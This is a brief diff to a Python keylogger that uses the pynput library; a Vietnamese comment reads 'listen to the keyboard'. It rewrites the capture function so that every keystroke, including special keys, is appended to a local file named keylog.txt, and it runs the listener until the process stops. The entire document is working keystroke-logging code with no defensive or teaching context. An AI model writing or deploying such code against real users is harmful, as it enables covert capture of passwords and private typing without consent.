@@ -1,15 +1,13 @@
 from pynput import keyboard
 
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:
-            print("Error getting char")
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open("keylog.txt", "a") as f:
+            f.write(f" [{key}] ")
 
-if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+# Lắng nghe bàn phím
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
